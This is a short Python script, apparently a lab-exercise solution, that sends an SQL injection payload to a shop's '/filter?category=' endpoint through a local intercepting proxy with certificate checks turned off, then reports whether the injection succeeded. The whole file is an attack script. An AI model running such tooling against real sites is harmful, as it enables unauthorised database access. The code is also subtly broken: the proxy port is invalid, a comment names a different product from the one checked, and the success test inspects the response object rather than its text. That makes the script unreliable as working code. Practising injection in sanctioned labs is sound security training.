import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies ={'http': 'http://127.0.0.1:80808', 'https': 'https://127.0.0.1:8080'}

def exploit_sql(url, payload):
    uri='/filter?category='
    r=requests.get(url+uri+payload, verify=False,proxies=proxies)
    
    #Here we are checking if there is a item named "AbZorba Ball" in output because it is not present in the normal output without sql-injection.
    if "Inflatable Dartboard" in r:
        return True
    else:
        return False
    
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" %sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' %sys.argv[0])
        sys.exit(-1)
        
    if exploit_sql(url,payload):
        print('[+] Injection successful')
    else:
        print('[-] Injection unsuccessful')
